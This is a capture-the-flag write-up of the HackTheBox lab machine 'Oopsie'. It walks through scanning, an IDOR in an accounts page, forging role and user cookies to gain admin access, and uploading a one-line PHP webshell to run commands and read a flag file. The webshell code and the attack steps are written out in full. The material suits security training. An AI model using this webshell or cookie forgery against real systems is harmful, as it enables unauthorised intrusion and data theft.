# Oopsie - HTB Starting Point

## Info
| Property   | Value                     |
| ---------- | ------------------------- |
| Platform   | HackTheBox Starting Point |
| Difficulty | Very Easy                 |
| OS         | Linux                     |
| IP         | 10.129.22.61              |
| Date       | 2026-03-16                |

---

## Key Concepts Learned
- Web Enumeration
- Insecure Direct Object Reference (IDOR)
	- Vulnerability where you can access other users' data by changing an ID in the URL or request
- Remote Code Execution (RCE)
	- Ability to execute commands on the target server via uploaded PHP webshell

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -A 10.129.22.61 
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 |  ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
| 80 | HTTP | Apache/2.4.29 (Ubuntu) |


### Web Enumeration

Visiting  `http://10.129.22.61`

Finding path to  login page as guest `http://10.129.22.61/cdn-cgi/login/`

---
## Exploitation

### The Attack Chain

```
Login as guest -> IDOR to find Admin Access ID -> Modify Cookies -> Upload PHP shell -> Code execution
```

### Step 1: Login as guest

```
http://10.129.22.61/cdn-cgi/login/
```

### Step 2: Changing an ID in the URL

```
http://10.129.23.38/cdn-cgi/login/admin.php?content=accounts&id=1
```

### Step 3: Modify cookies

Modify cookies on browser storage
role: admin
user: 34322

Now as admin we have access to upload file.
### Step 4: Create shell.php file

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Step 5: Upload file 

```
http://10.129.23.38/cdn-cgi/login/admin.php?content=uploads
```

### Step 6: Remote Code Execution

```
http://10.129.23.38/uploads/shell.php?cmd=cat+/home/robert/user.txt
```

---

## Lessons Learned

- **Always check Developer Tools** - Found login path via JavaScript files
- **IDOR is powerful** - Changing `id=` parameter exposed admin credentials
- **Cookies control access** - Modifying `role` and `user` cookies bypassed authentication
- **File upload = RCE** - If you can upload PHP, you likely have code execution
- **Use Burp Suite** - Essential for intercepting and modifying requests/cookies
- **Uploaded files may be cleaned** - Work fast or establish a reverse shell immediately

---

**Tags:** #htb #linux #idor #rce #file-upload #starting-point 